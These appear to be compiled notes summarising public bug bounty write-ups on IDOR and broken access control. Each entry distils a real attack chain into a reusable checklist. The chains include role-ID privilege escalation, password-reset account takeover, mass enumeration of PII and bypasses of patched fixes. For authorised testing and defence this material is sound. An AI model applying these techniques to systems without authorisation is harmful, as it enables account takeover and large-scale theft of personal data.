### [152] Agent→Admin self-privesc via UserRoleID + cookie swap (role IDs from API docs) — Whoami/mrro0o0tt (URL153)
- Client "Secure Portal". Invited himself as an Agent. To escalate: from a Super-Admin account (test) he captured the "update agent" request, noted the Agent's cookie, then in Repeater REPLACED the admin cookie with the AGENT cookie — request still processed. Body had `UserRoleID:5`; changing it to `4` = ADMIN → agent promotes self to admin. He learned the numeric role values from the target's **API documentation page** (Super-Admin add/update-agent guide). IDOR + BAC.
- Lesson/Q: role/permission fields (`UserRoleID`, `roleId`, `isAdmin`, `permissions[]`) in update requests are prime privesc IDOR — replay your own low-priv update with a higher role value. Read the app's API docs/Swagger to learn valid role IDs. "Does the update accept a role/permission field the UI doesn't let me change? What role values do the API docs reveal?"

### [153] Change ANOTHER user's role — must swap correlated id + email TOGETHER — Whoami/mrro0o0tt (URL154, NOVEL multi-field ref)
- Same `POST /update/user/12345`. He tried changing the user id to the Super-Admin's id to alter THEIR role → failed (server also validated the email). He then changed BOTH the id AND the email to the Super-Admin's values → worked → can set the portal owner's role to anything (e.g. demote to Salesman).
- Lesson/Q: when a single-id swap fails, the server may cross-check a SECOND correlated field — supply all matching identifiers together (id + email, id + username, id + tenantId). A failed swap isn't proof of safety; find every field that identifies the object and forge them as a set. "Is there a secondary field (email/username/uuid) the server pairs with the id? Does swapping the full identity tuple bypass the check?"

### [155] Edit other users' UGC via app-provided clientId (Google Slides Q&A) + triage persistence — Atikqur Rahman (URL156, $3,133.70)
- Google Slides "Audience Tools" live Q&A: anyone can ask questions WITHOUT login. Each question POST carries a unique `clientId` + `seriesId`; crucially the app LOADS everyone's clientIds to all viewers. With 2 accounts: submitted "Test" from acct-1, copied acct-1's clientId, intercepted acct-2's submit and replaced its clientId with acct-1's → acct-1's question was modified by acct-2 (works even unauthenticated). Google closed it twice citing "clientId guessing"; he proved the app auto-provides the clientId (no guessing) and got it reopened → S2 reward.
- Lesson/Q: when the app itself hands every client the object ids (rendered to all viewers, in responses/DOM), the "unguessable id" defense is void — harvest the id from the response and replay it. Unauthenticated UGC edit/delete is high impact. On triage pushback, prove the id is APP-SUPPLIED not guessed. "Does the server expose other users' object ids to me in normal responses? Can I modify/delete their content by replaying that id (even logged out)?"

### [156] Serialized org/group/ROLE IDs → cross-tenant privesc (PARTIAL) — Ahmex000 (URL157, body truncated — RETRY)
- Multi-tenant SaaS recon facts: creating an account yields an Organization with a SERIALIZED id (1111→1112…); groups serialized (2222,2223…); and the THREE roles each have SERIALIZED ids (OrgAdminId 3333, AccountAdminId 3334, RegularUserId 3335) — every org has the same roles with different ids. Invite flow lets you grant a user "access to all account groups" (default value 0). The chain abuses these predictable role/group ids (assign higher role / reference another org's objects) across a 3-bug privesc to P1. [Body truncated after setup — full exploit steps pending retry.]
- Lesson/Q: in B2B/multi-tenant apps, enumerate not just user/record ids but ORG, GROUP, and ROLE ids — they're frequently serialized, letting you reference a higher-privilege role or another tenant's groups. Watch default flags like "access to all groups = 0" (flip to 1/true). "Are org/group/role ids sequential? Can I assign myself a role id that belongs to a higher tier? Is there a default permission flag I can toggle?"

### [157] 30 BOLA/IDOR in one subdomain — JS route-table mining + HTTP method tampering + 2-account proxy diff — Ahmed Najeh/im4x (URL158, METHODOLOGY)
- Systematic process: (1) extract endpoints from JS files — the React router table exposed routes (`/classrooms/:id`, `/sessions`, `/sessions/create`) and API paths (`/api/sessions/`) leaking data. (2) Check supported HTTP methods in the JS; some accepted `DELETE` → `DELETE /api/classrooms/:id` actually deleted a classroom (escalated read-leak → destructive). (3) Create Admin + User accounts; add User to a classroom; proxy ONLY the User account and inspect HTTP history for admin data (emails etc.); confirm missing access control; then flip method to `DELETE` to remove users. (4) Collect admin-only JSON endpoints (`/api/recordings/<id>`) from the admin browser and replay them in the user browser to confirm cross-role access. Result: 30 findings.
- Lesson/Q: harvest the SPA's route table + API calls from JS, then for EACH endpoint test (a) object-id swap and (b) method tampering (GET→PUT/DELETE/PATCH). Run two accounts side by side, proxy the low-priv one, and diff what the high-priv one can reach. "What endpoints/methods does the JS reveal that the UI never exposes to me? If I change GET to DELETE/PUT on this object, does it work? Replaying admin's exact calls as a user — what still returns data?"

### [154] Consolidated IDOR/BAC testing methodology + mass-assignment — Dogx0x & TheXSSRat (URL155+URL160)
- Two near-identical comprehensive checklists. PREP: map roles (Admin/User/Guest) + access levels; create one account per role PLUS a guest/no-auth session; proxy everything (Burp/ZAP/Postman). IDOR tests: find `user_id`/`order_id`/`file_id` in URL+headers+body; substitute sequential / random / predictable ids; brute with Intruder/ffuf; file endpoints — alter filename in path (`/files/report_123.pdf`) or `?file=123`, try `../` traversal; inspect responses for leaked PII; **Mass Assignment** — add fields the UI never sends: `{"user_id":"123","is_admin":true}`. BAC tests: horizontal (`/user/123/profile` as another user) & vertical (hit `/admin`,`/manage` as user/guest); inject `role=admin` in headers/cookies/body; REMOVE role headers/tokens to bypass validation; drop session cookie to test unauth access; abuse multi-step workflows (skip steps, tamper `status=pending`); error-based testing (read "Access Denied"/"Invalid User ID" hints).
- Lesson/Q (checklist seed): for every object endpoint ask — sequential/encoded/hashed id? optional injectable id param? extra writable field (is_admin/role/owner)? works without auth or with role header stripped? destructive method allowed? "Have I tried mass-assignment, role-header injection, and auth-removal on this exact request, not just id swapping?"

### [158] ML Model Registry IDOR via GitLab gid:// global id (incremental) — 0day stories (URL159, $1160, GraphQL)
- Machine-learning model registry; models have incremental ids (1000401, 1000402…). GraphQL `getModel` request used `"id":"gid://******/Ml::Model/1000401"` (Rails/GitLab global-id format). Two accounts (attacker/victim); change the trailing number → access other users' PRIVATE models; the response also exposes VERSION ids → replay to pull private versions. Affected all tiers.
- Lesson/Q: in GraphQL/Rails apps the id is often a structured global id `gid://app/Type/<int>` — the `<int>` is the real, incrementable object reference; swap it. Use one private object you own as a template, then walk neighbors and recurse into nested ids (versions/children) the response reveals. "Does this gid/global-id embed a sequential integer? Do returned objects leak child ids I can request next?"

### [160] /api/users/me → swap `me` for numeric id → enumerate all PII — Nayeem/nayeems3c (URL161, Achmea swag)
- `GET /api/users/me` returned own record `{"id":24,email,full_name,address,date_of_birth}`. To learn the id type he replaced `me` with `24` → identical response (so the route accepts both `me` and the numeric id). Then `GET /api/users/23` → another user's PII; Intruder over sequential ids → every user's data.
- Lesson/Q: a `/me`/`/self`/`/current` endpoint usually has a sibling `/{id}` form — first confirm by swapping `me` for YOUR own id, then decrement to a neighbor. The self-record's own `id` field tells you the format/range to enumerate. "Does /me also resolve by explicit id? What does the response's own id field reveal about enumeration range?"

### [161] Base64-encoded email in password-reset link = pre-auth IDOR → ATO — Horus.sh (URL162)
- University e-sport PC-reservation portal. "Forgot Password" emailed a reset link `…/forgottenPassword?email=ZXhhbXBsZUB0ZXN0LnRlc3Q=` (base64 of his email). Decoded in CyberChef → cleartext email; re-encoded a roommate's email, opened the link → reset THEIR password → logged into their account. The email (the object ref) is base64-encoded and never tied to a per-user secret token.
- Lesson/Q: password-reset/verification links that carry an identity (email/userid), even base64/encoded, instead of an unguessable token are IDOR → account takeover. Always decode reset-link params and swap the identity. "Is the reset link keyed by a guessable identity (email/id) rather than a random one-time token? Does swapping it reset someone else's account?"

### [162] 70M PII via 3-chain: predictable AWB + MD5(phone) in HTML + uid API — Suyesh/susapr (URL163, NOVEL chain)
- Billion-dollar shipping firm. (1) Tracking `/tracking/{awb}` needs no auth; AWB = 3-digit airline prefix + 7-digit serial + 1 check digit where check = serial % 7 → he reverse-engineered the check-digit rule to GENERATE valid AWBs and brute-force tracking data. (2) Each tracking page's HTML embedded an **MD5 hash of the customer's phone number**. (3) A different subdomain API `…/api_version/user/info?uid={uid}` accepted that MD5(phone) as `uid` and returned full PII (mobile, address, city/state/country, email, name, pincode). MD5 is brute-forceable (phone keyspace small) → harvest PII for 70M+ customers; GDPR-grade breach.
- Lesson/Q: defeat "structured" ids by learning their FORMAT incl. check digits (often modulo) so you only generate valid ones. Hunt secondary identifiers leaked in HTML/JSON (a hash, a token) that another endpoint accepts as input — chain endpoint A's leak into endpoint B's lookup, even across subdomains. Weak hashes (MD5 of phone/email) are reversible keys. "What id format/check-digit can I reproduce? Does any response embed a hash/token that a second endpoint will accept? Can I brute the hash's small keyspace?"

### [163] Beginner IDOR methodology — param locations (incl. headers/cookies) + curl automation — Michael Cooter (URL164, OSWA)
- IDOR lives in 4 practical locations: URL query (`/profile?id=123`), POST body (`{"user_id":789}`), **HTTP headers (`X-User-ID:123`)**, and **cookies (`session=abc123`)** — test all four, not just the URL bar. Detection = modify the id and DIFF the response (content / status code / error message) to build a yes/no oracle. Workflow: Burp intercept → Repeater systematic swaps; export the request to **curl** for scripted enumeration; session-privilege test (low-priv account replays a high-priv request). Fix = server-side authz + indirect references (per-user tokens, not raw ids).
- Lesson/Q: don't forget id references hidden in HEADERS and COOKIES (`X-User-ID`, `X-Account-Id`, `role`, a `uid` cookie). "Is there an identifier in a custom header or cookie I can swap? Does the response visibly differ for authorized vs unauthorized ids (an oracle I can script with curl)?"

### [164] CRUD×role matrix → 4 IDORs incl. X-Account-Id tenant ref & mid-role bypass — Ahmed Hussein/Ahmed0x00 (URL165, METHODOLOGY ★)
- Thesis: IDOR ≠ id=1→2; it's broken access control over CRUD. Method: build a table of who can Create/Read/Update/Delete per role, then perform each restricted action from an account that shouldn't. Target model: companies→groups→members→roles(Admin/Support/Developer/View-Only); members manage bank accounts (money movement). Four bugs: (1) add any user to any group without an invite; (2) **create a bank account on ANY company** — `POST /api/accounts` with header `X-Account-Id:<company_id>`; swapped admin→view-only cookie = 200, even a NON-member user = 200 (tenant id rides in a header, no membership check); (3) **remove invites** — `DELETE /api/invites/<invite_id>` is admin-only, but `GET /api/invites/` with his OWN cookie LISTED all invite ids → then DELETE as View-Only = 200; (4) **delete a bank account** (admin-only) — View-Only = 403 (blocked) but **Support/Developer roles SUCCEEDED** (he didn't stop at the lowest role).
- Lesson/Q: build the CRUD×role matrix and attack every cell from a wrong account, including companies/orgs you're NOT a member of. Tenant/object id often rides in a header (`X-Account-Id`) — swap it. Harvest ids from the matching `GET /list` endpoint, then feed them to UPDATE/DELETE. Test EVERY role, not just the lowest — a mid-tier role (Support/Developer) may bypass a check that blocks View-Only. "For each CRUD action: which roles are blocked, and does a different non-admin role slip through? Is the tenant id in a swappable header? Can I list ids via GET then act on them?"

### [165] Chain partial-leak APIs to assemble a hard-to-guess user_id → PII (Intercom-style) — Shahd Qishta/shahdmk99 (URL44 full; NOVEL chain)
- The users API needed a hard-to-guess `user-id` and a no-role attacker had no way to get it ("vulnerability is of no use if you don't have user-ids"). But the app exposed several APIs to no-role users that redacted the *important* fields yet left STRUCTURAL ids visible. Chain: `GET /api/conversations?app_id=…` leaks `conversation_id` → `GET /api/conversation_parts?...&conversation_id=…` leaks `conversation_part_id` → `GET /api/cono/participants/part?...&conversation_id=…&conversation_part_id=…` leaks the participant `user_id` → `GET /api/users/<user_id>?app_id=…` → full user info disclosure.
- Lesson/Q: a "safe" id-gated endpoint becomes exploitable the moment ANY other endpoint leaks that id. Treat every id field in every response as a stepping stone; chain conversation→part→participant→user (or order→line→customer). Devs redact "sensitive" fields but forget the ids that unlock them. "Which low-privilege endpoints leak ids? Can I walk a chain of objects until I reach the id the protected endpoint wants?"

### [140] Fix-bypass: access code validated for EXISTENCE, not BOUND to the reservation — bombon/bxmbn (URL141, $10k, NOVEL fix-bypass ★)
- Sequel to his $5k "bank offer IDOR" (original: offer retrieval keyed only by an enumerable reservation number). The FIX added a per-reservation Access Code. Bypass: reservation numbers are STILL sequential/enumerable (yours …88, attacker's …89, others …90/91/92). Given (reservationNumber, accessCode), the server only checks the accessCode is VALID (tied to SOME reservation), NOT that it matches the requested reservation. So the attacker pairs THEIR OWN valid access code (531631) with the VICTIM's reservation number (0076448013416688) → access to the victim's offer. Enumerate reservation numbers + reuse own valid code → any user's offer/PII. $10,000.
- Lesson/Q (★ fix-bypass + broken binding): ALWAYS retest a patched IDOR — fixes that bolt on a "secret"/code/token are frequently validated for EXISTENCE but not BOUND to the specific object. Attack pattern: YOUR own valid token + the VICTIM's object id; and re-check the primary id is still enumerable. Generalizes to signed URLs, share tokens, OTPs, API keys reused across objects. "After the fix, is the new code actually tied to THIS object, or just checked for validity? Does my own valid code unlock someone else's id? Is the original id still sequential?"
